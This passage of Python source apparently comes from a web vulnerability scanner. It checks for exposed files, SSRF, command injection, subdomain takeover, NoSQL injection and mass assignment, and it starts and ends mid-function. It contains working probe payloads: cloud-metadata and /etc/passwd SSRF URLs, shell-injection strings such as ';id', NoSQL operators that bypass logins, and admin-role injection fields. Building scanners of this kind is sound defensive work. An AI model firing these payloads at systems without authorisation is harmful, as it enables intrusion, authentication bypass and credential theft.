                headers_out = headers_with_body.split("\r\n\r\n", 1)[0] if "\r\n\r\n" in headers_with_body else headers_with_body.split("\n\n", 1)[0]
        response_fp = create_fingerprint(content_out, headers_out)

        # Check if server is a catch-all (returns identical content for all paths)
        if canary_result.get("catch_all") and canary_result.get("fingerprint"):
            catch_all_hash = canary_result["fingerprint"]["content_hash"]
            if response_fp["hash"] == catch_all_hash:
                return None  # Same content as random non-existent paths = false positive

        # Filter out HTML responses for non-HTML paths to cut false positives
        if response_fp["has_html"]:
            pl = path.lower()
            if not (pl.endswith(('.html', '.htm', '.php', '.asp', '.aspx')) or pl.startswith('.git')):
                return None

        # Compare against canary fingerprints (only if we have them)
        for canary_fp in canary_fps:
            if canary_fp["hash"] == response_fp["hash"]:
                return None
            if canary_fp["length"] > 0 and abs(canary_fp["length"] - response_fp["length"]) < canary_fp["length"] * 0.1:
                if canary_fp.get("content_sample", "")[:200] == content_out[:200]:
                    return None
        expected_types = {".json": ["application/json", "text/json"], ".yml": ["text/yaml", "application/x-yaml", "text/plain"], ".yaml": ["text/yaml", "application/x-yaml", "text/plain"], ".xml": ["application/xml", "text/xml"], ".txt": ["text/plain"], ".env": ["text/plain", "application/octet-stream"]}
        for ext, types in expected_types.items():
            if path.endswith(ext) and response_fp["content_type"] and all(t not in response_fp["content_type"].lower() for t in types):
                return None

        # Filter out JSON error responses (frameworks like FastAPI return 200 with JSON error bodies)
        content_lower = content_out.lower().strip() if content_out else ""
        if content_lower.startswith('{'):
            try:
                json_body = json.loads(content_out.strip())
                # Common JSON error patterns (404s disguised as 200s)
                error_keys = {"detail", "error", "message", "status", "code"}
                error_values = {"not found", "not_found", "notfound", "404", "not exist", "does not exist"}
                if isinstance(json_body, dict):
                    # Check if it looks like an error response
                    if any(k.lower() in error_keys for k in json_body.keys()):
                        body_str = str(json_body).lower()
                        if any(v in body_str for v in error_values):
                            return None
            except (json.JSONDecodeError, ValueError):
                pass

        # Filter out plain-text soft-404 error responses (short generic error messages)
        # Be careful not to filter legitimate config files that happen to contain error words
        if len(content_lower) < 150:
            # Check if this looks like a config/secret file (has key=value or key: value patterns)
            # Matches: KEY=, key=, db.host=, api-key=, 2fa_secret=, etc.
            has_config_pattern = bool(re.search(r'(?m)^[A-Za-z0-9_][A-Za-z0-9_.\-]*\s*[=:]', content_out))
            if not has_config_pattern:
                # Only filter if error pattern is dominant (>40% of content)
                for pattern in SOFT_404_PATTERNS:
                    if pattern in content_lower:
                        # Error phrase must be substantial part of the response
                        if len(pattern) > len(content_lower) * 0.4 or len(content_lower) < 50:
                            return None
                        break

        # Critical files MUST have valid content markers - no marker = false positive
        path_lower = path.lower()
        for pattern, validator in CRITICAL_FILE_VALIDATORS.items():
            if pattern in path_lower:
                if not validator(content_out):
                    return None  # Reject without valid markers
                break  # Passed validation

        markers = derive_markers(path, content_out)
        public_markers = _public_discovery_markers(path, content_out)
        markers.extend(m for m in public_markers if m not in markers)
        public_referenced_paths = _public_discovery_non_public_references(path, content_out)
        if _is_public_discovery_noise(path, content_out, markers):
            return None

        return {
            "path": path,
            "status": "200",
            "content_length": response_fp["length"],
            "content_type": response_fp["content_type"],
            "confidence": guess_confidence(path, content_out, response_fp["content_type"]),
            "url": full_url,
            # Rich evidence preview (safe): hashes and markers only; no raw content
            "preview_first_line": response_fp["first_line"],
            "preview_hash16": response_fp["hash"],
            "has_html": response_fp["has_html"],
            "markers": markers,
            "referenced_paths": public_referenced_paths,
        }
    canary_result = await test_canary()
    canary_fps = [{"hash": c["content_hash"], "length": c["content_length"], "content_sample": c["content_sample"]} for c in canary_result.get("responses", [])]
    batch_size = 10
    for i in range(0, len(sensitive_paths), batch_size):
        batch = sensitive_paths[i : i + batch_size]
        results = await asyncio.gather(*[check_path_smart(p, canary_fps, canary_result) for p in batch])
        exposed.extend([r for r in results if r])

    # Bundle .git exposures into a single grouped finding with subentries
    git_entries = [e for e in exposed if e.get("path", "").lower().startswith(".git")]
    if git_entries:
        # Remove individual git entries
        exposed = [e for e in exposed if e not in git_entries]
        conf_rank = {"low": 0, "medium": 1, "high": 2}
        agg_conf = max(git_entries, key=lambda x: conf_rank.get((x.get("confidence") or "low").lower(), 0)).get("confidence")
        subentries = [{
            "path": ge.get("path"),
            "url": ge.get("url"),
            "preview_first_line": ge.get("preview_first_line"),
            "preview_hash16": ge.get("preview_hash16"),
            "has_html": ge.get("has_html"),
        } for ge in git_entries]
        markers = sorted({m for ge in git_entries for m in (ge.get("markers") or [])})
        exposed.append({
            "path": ".git/ (repository metadata)",
            "url": urllib.parse.urljoin(base_url, "/.git/"),
            "confidence": (agg_conf or "medium"),
            "content_type": "various",
            "size": None,
            "group": "git",
            "markers": markers,
            "subentries": subentries,
            "preview_first_line": (git_entries[0].get("preview_first_line") if git_entries else None),
            "preview_hash16": None,
            "has_html": any(ge.get("has_html") for ge in git_entries),
        })

    exposed = _collapse_duplicate_exposed_file_entries(exposed)

    return {"exposed_files": exposed[:20]}


async def advanced_vuln_tests(
    base_url: str,
    exploit_level: str = "safe",
    candidates: list[dict[str, Any]] | None = None,
    auth_session: Any | None = None,
) -> dict[str, Any]:
    import aiohttp
    results: dict[str, Any] = {
        "ssrf": {"tested": False, "vulnerable": False, "evidence": [], "tested_endpoints": 0},
        "xxe": {"tested": False, "vulnerable": False, "evidence": []},
        "command_injection": {"tested": False, "vulnerable": False, "evidence": [], "tested_endpoints": 0},
        "scan_completed": False,
    }

    if not candidates:
        results["scan_completed"] = False
        results["skipped"] = True
        results["reason"] = "no_candidate_endpoints"
        return results

    ssrf_payloads = ["http://169.254.169.254/latest/meta-data/", "http://localhost:22", "file:///etc/passwd"]
    cmd_payloads = [";id", "|id", "$(id)", "`id`"]

    headers = {}
    cookies = {}
    try:
        if auth_session and getattr(auth_session, "config", None):
            headers = dict(getattr(auth_session.config, "headers", {}) or {})
            cookies = dict(getattr(auth_session.config, "cookies", {}) or {})
    except Exception:
        headers = {}
        cookies = {}

    def _apply_payload(url: str, param: str, payload: str) -> str:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

    ssrf_candidates = [c for c in candidates if c.get("type") == "ssrf"]
    cmd_candidates = [c for c in candidates if c.get("type") == "cmd"]

    async with aiohttp.ClientSession(headers=headers, cookies=cookies) as session:
        # SSRF probes (only if we have candidate params)
        for payload in ssrf_payloads[:1 if exploit_level == "safe" else 3]:
            for candidate in ssrf_candidates[:10]:
                try:
                    test_url = _apply_payload(candidate["url"], candidate["param"], payload)
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        body = await resp.text()
                        results["ssrf"]["tested"] = True
                        results["ssrf"]["tested_endpoints"] += 1
                        if "root:x:" in body or "instance-id" in body:
                            results["ssrf"]["vulnerable"] = True
                            results["ssrf"]["evidence"].append({
                                "url": test_url,
                                "payload": payload,
                            })
                except Exception:
                    continue

        # Command injection probes (only for non-safe exploit levels)
        if exploit_level != "safe":
            for payload in cmd_payloads[:2]:
                for candidate in cmd_candidates[:10]:
                    try:
                        test_url = _apply_payload(candidate["url"], candidate["param"], payload)
                        async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                            body = await resp.text()
                            results["command_injection"]["tested"] = True
                            results["command_injection"]["tested_endpoints"] += 1
                            if "uid=" in body and "gid=" in body:
                                results["command_injection"]["vulnerable"] = True
                                results["command_injection"]["evidence"].append({
                                    "url": test_url,
                                    "payload": payload,
                                })
                    except Exception:
                        continue

    results["scan_completed"] = True
    return results


async def subdomain_takeover_check(host: str) -> dict[str, Any]:
    results: dict[str, Any] = {"vulnerable": False, "dangling_cnames": [], "vulnerable_services": [], "evidence": []}
    out, err, rc = await run(["dig", "+short", "+tries=1", "+time=2", "CNAME", host], timeout=10)
    if rc == 0 and out:
        lines = [l.strip() for l in out.splitlines() if l.strip() and not l.startswith(';;') and 'communications error' not in l]
        cname = lines[0] if lines else None
        if cname:
            vulnerable_patterns = {
                "github.io": "There isn't a GitHub Pages site here",
                "herokuapp.com": "No such app",
                "azurewebsites.net": "404 Web Site not found",
                "cloudfront.net": "Bad Request: ERROR: The request could not be satisfied",
                "s3.amazonaws.com": "NoSuchBucket",
                "shopify.com": "Sorry, this shop is currently unavailable",
                "tumblr.com": "There's nothing here",
                "wordpress.com": "Do you want to register",
                "zendesk.com": "Help Center Closed",
            }
            for service, fingerprint in vulnerable_patterns.items():
                if service in cname:
                    service_out, service_err, service_rc = await run(["curl", "-sS", "-L", "-k", "--max-time", "10", f"http://{host}"], timeout=15)
                    if service_rc == 0 and fingerprint in service_out:
                        results["vulnerable"] = True
                        results["dangling_cnames"].append(cname)
                        results["vulnerable_services"].append(service)
                        results["evidence"].append({"cname": cname, "service": service, "fingerprint": fingerprint[:100]})
    ns_out, ns_err, ns_rc = await run(["dig", "+short", "+tries=1", "+time=2", "NS", host], timeout=10)
    if ns_rc == 0 and ns_out:
        ns_lines = [l.strip() for l in ns_out.splitlines() if l.strip() and not l.startswith(';;') and 'communications error' not in l]
        for ns_record in ns_lines:
            ns_check, _, ns_check_rc = await run(["dig", "+short", "+tries=1", "+time=2", "@" + ns_record.strip('.'), host], timeout=5)
            if ns_check_rc != 0:
                results["vulnerable"] = True
                results["evidence"].append({"type": "dead_nameserver", "nameserver": ns_record, "description": "Nameserver not responding, potential NS takeover"})
    return results


async def nosql_injection_test(url: str) -> dict[str, Any]:
    """
    Test for NoSQL injection vulnerabilities with strict validation.

    IMPORTANT: Only reports vulnerabilities when there is STRONG evidence:
    - Time-based: Response delay significantly higher than baseline (>4s AND >2x)
    - Error-based: Actual MongoDB/NoSQL error patterns in non-HTML responses

    This prevents false positives from:
    - SPAs that return HTML for all requests
    - Generic error pages
    - WAF/honeypot responses
    """
    results: dict[str, Any] = {"vulnerable": False, "payloads_tested": [], "evidence": []}
    payloads: list[Any] = [{"$ne": "1"}, {"$gt": ""}, {"$regex": ".*"}, "';return true;var foo='", "\\x27;return true;var foo=\\x27", "{\"$ne\":null}", "{\"$ne\":\"\"}", "{\"$or\":[{},{}]}", "';while(1);var foo='", "';sleep(5000);var foo='", "[\"$ne\"]", "{\"$where\":\"sleep(5000)\"}"]

    def _is_html_response(content: str) -> bool:
        """Check if response is HTML (likely SPA catch-all or error page)."""
        if not content:
            return False
        content_lower = content[:2000].lower()
        html_indicators = ["<!doctype", "<html", "<head>", "<body>", "<script", "<title>"]
        html_matches = sum(1 for ind in html_indicators if ind in content_lower)
        return html_matches >= 2

    def _has_nosql_error(content: str) -> tuple[bool, str | None]:
        """
        Check for actual MongoDB/NoSQL error patterns.
        Returns (is_vulnerable, matched_pattern).
        """
        if not content:
            return False, None

        # Specific MongoDB/NoSQL error patterns that indicate real vulnerabilities
        error_patterns = [
            (r'MongoError:\s+\w+', 'MongoError'),
            (r'mongoose\.Error:\s+\w+', 'mongoose.Error'),
            (r'E11000 duplicate key error', 'E11000'),
            (r'Failed to parse.*BSON', 'BSON parse error'),
            (r'ObjectId\("[a-f0-9]{24}"\).*error', 'ObjectId error'),
            (r'db\.collection\.\w+.*Error', 'db.collection error'),
            (r'MongoServerError:\s+\w+', 'MongoServerError'),
            (r'BSONTypeError', 'BSONTypeError'),
            (r'CastError:.*ObjectId', 'CastError ObjectId'),
            (r'MongooseError', 'MongooseError'),
        ]

        for pattern, name in error_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True, name
        return False, None

    # Get baseline timing for time-based detection (3 samples to establish normal response time)
    baseline_times = []
    for _ in range(3):
        start = time.time()
        baseline_url = f"{url}&baseline=test" if "?" in url else f"{url}?baseline=test"
        await run(["curl", "-sS", "-L", "-k", "--max-time", "10", baseline_url], timeout=15)
        baseline_times.append(time.time() - start)
    baseline_avg = sum(baseline_times) / len(baseline_times) if baseline_times else 1.0

    for payload in payloads:
        payload_str = json.dumps(payload) if isinstance(payload, dict) else str(payload)
        test_url = f"{url}&nosql={urllib.parse.quote(payload_str)}" if "?" in url else f"{url}?nosql={urllib.parse.quote(payload_str)}"
        start_time = time.time()
        out, err, rc = await run(["curl", "-sS", "-L", "-k", "--max-time", "10", test_url], timeout=15)
        elapsed = time.time() - start_time
        results["payloads_tested"].append(payload_str)
        if rc == 0 and out:
            # Time-based detection with strict baseline comparison
            if "sleep" in payload_str:
                # Only flag if delay is SIGNIFICANTLY higher than baseline (>4s above baseline AND >2x baseline)
                if elapsed > baseline_avg + 4.0 and elapsed > baseline_avg * 2:
                    results["vulnerable"] = True
                    results["evidence"].append({"type": "time-based", "payload": payload_str, "delay": elapsed, "baseline": baseline_avg})
            else:
                # CRITICAL FP FIX: Reject HTML responses before checking for errors
                # SPAs and error pages return HTML for all paths - this is NOT a vulnerability
                if _is_html_response(out):
                    continue  # Skip - HTML response is not evidence of NoSQL injection

                # Check for actual MongoDB error patterns
                has_error, error_type = _has_nosql_error(out)
                if has_error:
                    # Additional validation: require error context (stack trace, line numbers)
                    has_context = any(trace in out for trace in [
                        ' at ', 'Error:', 'Exception:', 'Traceback', 'Stack trace',
                        'line ', 'at line', 'column '
                    ])
                    if has_context:
                        results["vulnerable"] = True
                        results["evidence"].append({
                            "type": "error-based",
                            "payload": payload_str,
                            "error_pattern": error_type,
                            "response_snippet": out[:500]
                        })

        # POST-based testing for JSON payloads
        if "{" in payload_str:
            post_out, post_err, post_rc = await run(["curl", "-sS", "-X", "POST", "-L", "-k", "--max-time", "10", "-H", "Content-Type: application/json", "-d", payload_str, url], timeout=15)
            if post_rc == 0 and post_out:
                # CRITICAL FP FIX: Reject HTML responses
                if _is_html_response(post_out):
                    continue  # Skip - HTML response is not evidence

                # Check for actual MongoDB error patterns
                has_error, error_type = _has_nosql_error(post_out)
                if has_error:
                    # Require error context for POST responses too
                    if re.search(r'(Error|Exception).*(\n.*){2,}', post_out, re.IGNORECASE):
                        results["vulnerable"] = True
                        results["evidence"].append({
                            "type": "error-based-post",
                            "payload": payload_str,
                            "error_pattern": error_type,
                            "response_snippet": post_out[:500]
                        })
    return results


async def nosql_injection_test_json_body(
    url: str,
    method: str = "POST",
    params: list[str] | None = None,
    auth_session: Any | None = None,
    body_template: dict[str, Any] | None = None,
    body_param_defaults: dict[str, Any] | None = None,
) -> dict[str, Any]:
    """
    Test for NoSQL injection in JSON body parameters.

    This is specifically designed for API endpoints that accept JSON bodies
    (like crAPI's coupon validation endpoint).

    Args:
        url: The endpoint URL
        method: HTTP method (POST, PUT, PATCH)
        params: List of parameter names to test
        auth_session: Optional auth session for authenticated requests

    Returns:
        dict with 'vulnerable', 'findings', 'params_tested'
    """
    results: dict[str, Any] = {
        "vulnerable": False,
        "findings": [],
        "params_tested": 0,
        "url": url,
        "method": method,
    }

    if not params:
        return results

    meta_pattern = re.compile(r"__SHAKERSCAN_NOSQL__(\d{3})__SHAKERSCAN_NOSQL__$")

    def _parse_meta(raw: str) -> tuple[str, int | None]:
        if not raw:
            return "", None
        match = meta_pattern.search(raw.strip())
        if not match:
            return raw, None
        body = raw[: match.start()]
        return body, int(match.group(1))

    def _param_tokens(name: str) -> set[str]:
        return {part for part in re.split(r"[^a-z0-9]+", name.lower()) if part}

    def _is_identity_param(name: str) -> bool:
        lowered = name.lower()
        tokens = _param_tokens(lowered)
        return (
            "email" in lowered
            or "username" in lowered
            or "user_name" in lowered
            or "login" in tokens
            or "userid" in lowered
            or "user" in tokens
        )

    def _is_secret_param(name: str) -> bool:
        lowered = name.lower()
        return "password" in lowered or "passwd" in lowered or lowered in {"pass", "pwd"}

    def _is_auth_failure(status: int | None, body: str) -> bool:
        lowered = (body or "").lower()
        failure_markers = (
            "invalid credentials", "invalid email", "invalid password",
            "login failed", "authentication failed", "unauthorized",
            "forbidden", "wrong password", "user not found",
        )
        return (status in {400, 401, 403, 404, 422}) or any(marker in lowered for marker in failure_markers)

    def _flatten_json_keys(value: Any, prefix: str = "") -> set[str]:
        keys: set[str] = set()
        if isinstance(value, dict):
            for key, child in value.items():
                key_text = str(key)
                full = f"{prefix}.{key_text}" if prefix else key_text
                keys.add(full.lower())
                keys.update(_flatten_json_keys(child, full))
        elif isinstance(value, list):
            for child in value[:5]:
                keys.update(_flatten_json_keys(child, prefix))
        return keys

    def _auth_success_signals(body: str) -> list[str]:
        if not body:
            return []
        lowered = body.lower()
        signals: set[str] = set()
        try:
            parsed = json.loads(body)
        except Exception:
            parsed = None
        if parsed is not None:
            keys = _flatten_json_keys(parsed)
            auth_key_fragments = (
                "token", "access_token", "refreshtoken", "refresh_token",
                "jwt", "session", "authentication", "authorization",
            )
            identity_key_fragments = (
                "user", "username", "email", "role", "roles", "account", "profile",
            )
            if any(any(fragment in key for fragment in auth_key_fragments) for key in keys):
                signals.add("auth_token_or_session")
            if any(any(fragment in key for fragment in identity_key_fragments) for key in keys):
                signals.add("user_identity_data")
        text_markers = (
            '"token"', '"access_token"', '"accessToken"', '"refresh_token"',
            '"jwt"', '"authentication"', '"authorization"', '"session"',
        )
        if any(marker.lower() in lowered for marker in text_markers):
            signals.add("auth_token_or_session")
        if re.search(r'"(?:email|username|role|user(?:_id|id)?)"\s*:', body, re.I):
            signals.add("user_identity_data")
        return sorted(signals)

    # NoSQLi payloads for JSON body injection
    nosql_payloads = [
        {"$ne": ""},                   # Not equal to empty - bypasses auth
        {"$ne": "invalid"},            # Not equal to invalid value
        {"$ne": None},                 # Not equal null
        {"$gt": ""},                   # Greater than empty
        {"$regex": ".*"},              # Regex match all
        {"$regex": ".*", "$options": "i"},
        {"$exists": True},             # Field exists
        {"$in": [""]},
        {"$nin": ["invalid"]},
        {"$or": [{}, {}]},
        {"$where": "function(){return true;}"},
    ]

    auth_args = get_auth_curl_args(auth_session)
    debug_nosql = os.environ.get("SCANNER_DEBUG_NOSQL", "").lower() in ("1", "true", "yes")

    base_body: dict[str, Any] = {}
    if isinstance(body_template, dict):
        base_body = copy.deepcopy(body_template)
    for name, value in (body_param_defaults or {}).items():
        if not _has_nested_key(base_body, name):
            _set_nested_value(base_body, name, value, overwrite=False)
    for name in params[:10]:
        if not _has_nested_key(base_body, name):
            _set_nested_value(base_body, name, _fallback_value_for_param(name), overwrite=False)

    if debug_nosql:
        print(f"[DEBUG NoSQL Test] url={url} method={method} params={params}", file=sys.stderr)
        print(f"[DEBUG NoSQL Test] base_body={base_body}", file=sys.stderr)

    identity_params = [p for p in params if _is_identity_param(p)]
    secret_params = [p for p in params if _is_secret_param(p)]
    if identity_params and secret_params:
        identity_param = identity_params[0]
        secret_param = secret_params[0]
        baseline_payload = copy.deepcopy(base_body)
        _set_nested_value(baseline_payload, identity_param, _fallback_value_for_param(identity_param), overwrite=True)
        _set_nested_value(baseline_payload, secret_param, "shakerscan_invalid_password_12345", overwrite=True)
        baseline_body = json.dumps(baseline_payload)
        baseline_cmd = [
            "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
            "-H", "Content-Type: application/json",
            "-d", baseline_body,
            "-w", "__SHAKERSCAN_NOSQL__%{http_code}__SHAKERSCAN_NOSQL__",
        ] + auth_args + [url]
        baseline_raw, _, baseline_rc = await run(baseline_cmd, timeout=15)
        baseline_out, baseline_code = _parse_meta(baseline_raw or "")
        if baseline_rc == 0 and baseline_code in (405, 415, 501):
            results["skipped"] = True
            results["reason"] = "method_or_content_type_not_supported"
            results["baseline_status"] = baseline_code
            return results

        if baseline_rc == 0 and _is_auth_failure(baseline_code, baseline_out):
            combo_payloads = [
                {"$ne": None},
                {"$ne": ""},
                {"$gt": ""},
                {"$regex": ".*"},
            ]
            for payload in combo_payloads:
                test_payload = copy.deepcopy(base_body)
                _set_nested_value(test_payload, identity_param, payload, overwrite=True)
                _set_nested_value(test_payload, secret_param, payload, overwrite=True)
                test_body = json.dumps(test_payload)
                test_cmd = [
                    "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
                    "-H", "Content-Type: application/json",
                    "-d", test_body,
                    "-w", "__SHAKERSCAN_NOSQL__%{http_code}__SHAKERSCAN_NOSQL__",
                ] + auth_args + [url]
                test_raw, _, test_rc = await run(test_cmd, timeout=15)
                if test_rc != 0:
                    continue
                test_out, test_code = _parse_meta(test_raw or "")
                if test_code in (405, 415, 501):
                    continue
                if test_out and ("<!DOCTYPE" in test_out[:200] or "<html" in test_out[:200].lower()):
                    continue
                success_signals = _auth_success_signals(test_out)
                if test_code is not None and test_code < 400 and len(success_signals) >= 2:
                    results["vulnerable"] = True
                    results["findings"].append({
                        "parameter": f"{identity_param},{secret_param}",
                        "payload": json.dumps({identity_param: payload, secret_param: payload}),
                        "evidence_type": "credential_operator_bypass",
                        "baseline_status": baseline_code,
                        "payload_status": test_code,
                        "success_signals": success_signals,
                        "baseline_length": len(baseline_out or ""),
                        "payload_length": len(test_out or ""),
                        "response_snippet": test_out[:500] if test_out else "",
                    })
                    return results

    for param in params[:5]:  # Limit to first 5 params
        results["params_tested"] += 1

        # Baseline: send normal request with safe value
        baseline_payload = copy.deepcopy(base_body)
        _set_nested_value(baseline_payload, param, "test_baseline_value_12345", overwrite=True)
        baseline_body = json.dumps(baseline_payload)
        baseline_cmd = [
            "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
            "-H", "Content-Type: application/json",
            "-d", baseline_body,
            "-w", "__SHAKERSCAN_NOSQL__%{http_code}__SHAKERSCAN_NOSQL__",
        ] + auth_args + [url]
        baseline_raw, _, baseline_rc = await run(baseline_cmd, timeout=15)
        baseline_out, baseline_code = _parse_meta(baseline_raw or "")
        baseline_len = len(baseline_out) if baseline_out else 0
        if debug_nosql:
            print(f"[DEBUG NoSQL Test] param={param} baseline_body={baseline_body}", file=sys.stderr)
            print(f"[DEBUG NoSQL Test] baseline_out={baseline_out[:200] if baseline_out else 'None'}...", file=sys.stderr)
            print(f"[DEBUG NoSQL Test] baseline_len={baseline_len}", file=sys.stderr)

        if baseline_rc != 0:
            continue
        if baseline_code in (405, 415, 501):
            results["skipped"] = True
            results["reason"] = "method_or_content_type_not_supported"
            results["baseline_status"] = baseline_code
            return results

        # Test each NoSQLi payload
        for payload in nosql_payloads:
            test_payload = copy.deepcopy(base_body)
            _set_nested_value(test_payload, param, payload, overwrite=True)
            test_body = json.dumps(test_payload)
            test_cmd = [
                "curl", "-sS", "-X", method, "-L", "-k", "--max-time", "10",
                "-H", "Content-Type: application/json",
                "-d", test_body,
                "-w", "__SHAKERSCAN_NOSQL__%{http_code}__SHAKERSCAN_NOSQL__",
            ] + auth_args + [url]
            test_raw, _, test_rc = await run(test_cmd, timeout=15)

            if test_rc != 0:
                continue

            test_out, test_code = _parse_meta(test_raw or "")
            test_len = len(test_out) if test_out else 0
            if test_code in (405, 415, 501):
                continue

            # DEBUG: Log the first payload test result
            if debug_nosql and payload == nosql_payloads[0]:
                print(f"[DEBUG NoSQL Test] First payload test_body={test_body}", file=sys.stderr)
                print(f"[DEBUG NoSQL Test] First payload test_out={test_out[:200] if test_out else 'None'}...", file=sys.stderr)
                print(f"[DEBUG NoSQL Test] First payload test_len={test_len}", file=sys.stderr)

            # Detection heuristics:
            # 1. Response length significantly different (success vs error)
            # 2. Response contains data that shouldn't be returned
            # 3. Response indicates successful operation when it should fail

            # Skip HTML responses (error pages)
            if test_out and ("<!DOCTYPE" in test_out[:200] or "<html" in test_out[:200].lower()):
                continue

            # Skip if response contains SQL database errors (not NoSQL)
            # This prevents misclassifying SQL errors as NoSQL injection
            # Note: patterns must be specific to SQL to avoid false negatives
            test_out_lower = test_out.lower() if test_out else ""
            sql_error_patterns = [
                # Database product names
                "sqlite", "mysql", "postgresql", "pg_query", "psql",
                "mssql", "sql server",
                # SQL-specific error codes/states
                "sqlstate", "sqlexception",
                # SQL syntax errors (must include SQL context)
                "sql syntax", "sql statement", "sql query",
                "near \"select\"", "near \"insert\"", "near \"update\"",
                "near \"delete\"", "near \"from\"", "near \"where\"",
                # Column/table errors (SQL-specific phrasing)
                "no such column", "unknown column", "no such table",
                "ambiguous column", "datatype mismatch",
            ]
            # Oracle errors: ORA-xxxxx format (e.g., ORA-00942, ORA-01017)
            has_oracle_error = "ora-" in test_out_lower and any(
                f"ora-{d}" in test_out_lower for d in "0123456789"
            )
            if test_out_lower and (has_oracle_error or any(p in test_out_lower for p in sql_error_patterns)):
                continue  # This is a SQL database, not NoSQL

            # Check for behavioral differences
            is_vulnerable = False
            evidence_type = ""

            # Pre-compute success/error indicators
            error_markers = [
                "error", "errors", "invalid", "not found", "failed", "unauthorized",
                "forbidden", "exception", "validation error", "unprocessable",
            ]
            baseline_lower = (baseline_out or "").lower()
            test_lower = (test_out or "").lower()
            baseline_is_error = (baseline_code is not None and baseline_code >= 400) or any(m in baseline_lower for m in error_markers)
            test_is_success = (test_code is not None and test_code < 400) and not any(m in test_lower for m in error_markers)

            # Significant length difference (use lower threshold for small baselines)
            min_diff = min(100, max(20, baseline_len * 2))
            if baseline_is_error and test_is_success and test_len > baseline_len * 1.5 and test_len > baseline_len + min_diff:
                is_vulnerable = True
                evidence_type = "length_difference"
                if debug_nosql:
                    print(f"[DEBUG NoSQL Test] LENGTH DIFFERENCE DETECTED: baseline={baseline_len} test={test_len}", file=sys.stderr)

            # Empty/minimal baseline with substantial response (catches {} -> data)
            baseline_minimal = baseline_len <= 10 or baseline_out in ('{}', '[]', 'null', '')
            if baseline_minimal and test_len > 30 and test_is_success:
                is_vulnerable = True
                evidence_type = "empty_baseline_bypass"
                if debug_nosql:
                    print(f"[DEBUG NoSQL Test] EMPTY BASELINE BYPASS DETECTED!", file=sys.stderr)

            # Response looks like success when baseline was error
            if baseline_out and test_out:
                baseline_looks_error = baseline_is_error

                # DEBUG: Log the heuristic evaluation
                if debug_nosql and payload == nosql_payloads[0]:
                    print(f"[DEBUG NoSQL Test] baseline_looks_error={baseline_looks_error} test_looks_success={test_is_success}", file=sys.stderr)

                if baseline_looks_error and test_is_success and test_len > 50:
                    is_vulnerable = True
                    evidence_type = "bypass_error"
                    if debug_nosql:
                        print(f"[DEBUG NoSQL Test] BYPASS ERROR DETECTED!", file=sys.stderr)

            # Response contains unexpected data fields
            data_indicators = ['"id"', '"_id"', '"email"', '"user', '"token"', '"coupon"', '"code"', '"amount"']
            test_has_data = any(x in test_out.lower() for x in data_indicators) if test_out else False
            baseline_has_data = any(x in (baseline_out or "").lower() for x in data_indicators)
            if test_has_data and not baseline_has_data and test_is_success:
                is_vulnerable = True
                evidence_type = "data_leak"
                if debug_nosql:
                    print(f"[DEBUG NoSQL Test] DATA LEAK DETECTED!", file=sys.stderr)

            if is_vulnerable:
                results["vulnerable"] = True
                results["findings"].append({
                    "parameter": param,
                    "payload": json.dumps(payload),
                    "evidence_type": evidence_type,
                    "baseline_length": baseline_len,
                    "payload_length": test_len,
                    "response_snippet": test_out[:500] if test_out else "",
                })
                break  # Found vuln for this param, move to next

    return results


async def mass_assignment_test_json_body(
    url: str,
    method: str = "POST",
    params: list[str] | None = None,
    auth_session: Any | None = None,
    body_template: dict[str, Any] | None = None,
    body_param_defaults: dict[str, Any] | None = None,
    content_type: str = "application/json",
    max_fields: int = 8,
) -> dict[str, Any]:
    """Test discovered JSON endpoints for strict mass-assignment acceptance.

    This is intentionally proof-oriented: it only reports when the response is
    successful JSON and reflects the injected privileged field/value while the
    baseline response did not already expose that same value.
    """
    results: dict[str, Any] = {
        "vulnerable": False,
        "findings": [],
        "fields_tested": 0,
        "url": url,
        "method": method,
    }
    dangerous_fields: list[tuple[str, Any, str]] = [
        ("role", "admin", "role_escalation"),
        ("user_role", "admin", "role_escalation"),
        ("userType", "admin", "role_escalation"),
        ("isAdmin", True, "admin_flags"),
        ("is_admin", True, "admin_flags"),
        ("admin", True, "admin_flags"),
        ("isVerified", True, "account_status"),
        ("verified", True, "account_status"),
        ("balance", 1000000, "business_logic"),
        ("discount", 100, "business_logic"),
    ]
    parsed_url = urllib.parse.urlparse(url)
    endpoint_path = parsed_url.path or "/"
    custom_endpoint = f"{method.upper()} {endpoint_path}"
    if parsed_url.query:
        custom_endpoint = f"{custom_endpoint}?{parsed_url.query}"
    attempt: dict[str, Any] = {
        "custom_endpoint": custom_endpoint,
        "family": "mass_assignment",
        "method": method.upper(),
        "url": url,
        "param_count": min(max(1, int(max_fields or 1)), len(dangerous_fields)),
        "attempted_params_count": 0,
        "completed_params_count": 0,
        "status": "started",
    }
    results["endpoint_attempts"] = [attempt]
    if "json" not in (content_type or "").lower():
        results["skipped"] = True
        results["reason"] = "non_json_content_type"
        attempt["status"] = "skipped"
        attempt["skip_reason"] = "non_json_content_type"
        return results

    params = params or []
    base_body: dict[str, Any] = {}
    if isinstance(body_template, dict):
        base_body = copy.deepcopy(body_template)
    for name, value in (body_param_defaults or {}).items():
        if not _has_nested_key(base_body, name):
            _set_nested_value(base_body, name, value, overwrite=False)
    for name in params[:12]:
        if not _has_nested_key(base_body, name):
            _set_nested_value(base_body, name, _fallback_value_for_param(name), overwrite=False)
    if "json" in (content_type or "").lower() and base_body:
        attempt["custom_endpoint"] = (
            f"{method.upper()} {endpoint_path} json:"
            + json.dumps(base_body, separators=(",", ":"))
        )

    rejection_markers = (
        "not allowed", "forbidden", "unknown field", "invalid field",
        "unexpected", "cannot set", "read only", "readonly", "not permitted",
    )

    def _parse_meta(raw: str) -> tuple[str, int | None]:
        marker_pattern = re.compile(r"__SHAKERSCAN_MASS_ASSIGN__(\d{3})__SHAKERSCAN_MASS_ASSIGN__$")
        if not raw:
            return raw or "", None
        match = marker_pattern.search(raw.strip())
        if not match:
            return raw, None
        return raw[: match.start()], int(match.group(1))

    def _norm_key(name: str) -> str:
